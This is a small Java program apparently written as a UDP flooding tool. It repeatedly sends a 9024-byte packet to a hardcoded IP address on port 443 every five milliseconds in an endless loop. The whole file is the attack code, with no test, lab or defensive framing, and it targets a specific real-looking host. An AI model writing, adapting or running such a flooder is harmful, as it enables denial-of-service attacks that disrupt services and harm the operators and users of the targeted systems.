package dns001;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;


public class JavaApplication3 {
public static void main(String args[]) throws UnknownHostException, SocketException, IOException, InterruptedException {
String hostname = "177.51.65.119";
int port = 443;

InetAddress address = InetAddress.getByName(hostname);
DatagramSocket socket = new DatagramSocket();

byte[] buffer = new byte[9024];

DatagramPacket request = new DatagramPacket(buffer, buffer.length, address, port);

while (true) {
socket.send(request);
Thread.sleep(5);
}
}
}